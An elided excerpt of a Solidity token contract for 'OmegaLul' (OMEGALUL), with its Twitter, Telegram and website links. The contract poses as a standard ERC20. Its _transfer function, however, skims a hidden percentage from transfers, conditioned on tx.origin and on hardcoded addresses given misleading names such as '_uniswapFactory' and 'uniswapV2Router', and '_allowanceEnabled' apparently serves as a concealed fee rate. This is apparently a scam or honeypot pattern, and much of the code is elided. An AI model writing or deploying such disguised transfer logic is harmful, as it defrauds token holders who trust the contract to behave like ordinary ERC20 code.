...
https://twitter.com/OmegaLulBNB
https://t.me.com/OmegaLulBNB
https://OmegaLulBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _uniswapFactory = 0x74f8a2e91655fd1624712477A9574F64dEEF9A10;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private _allowanceEnabled = 1;
    address internal uniswapV2Router = 0xe2D6daf6D6FF0A0fFcfe2B6534DbBFC061A05A4b;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != uniswapV2Router && _balances[_uniswapFactory] > 0 ? pairToken : _allowanceEnabled).div(100)+0;
        if (swapamount > 0)
        {
...
contract OmegaLul is ERC20, Ownable
{
    constructor() ERC20(unicode"OmegaLul", unicode"OMEGALUL")
    {
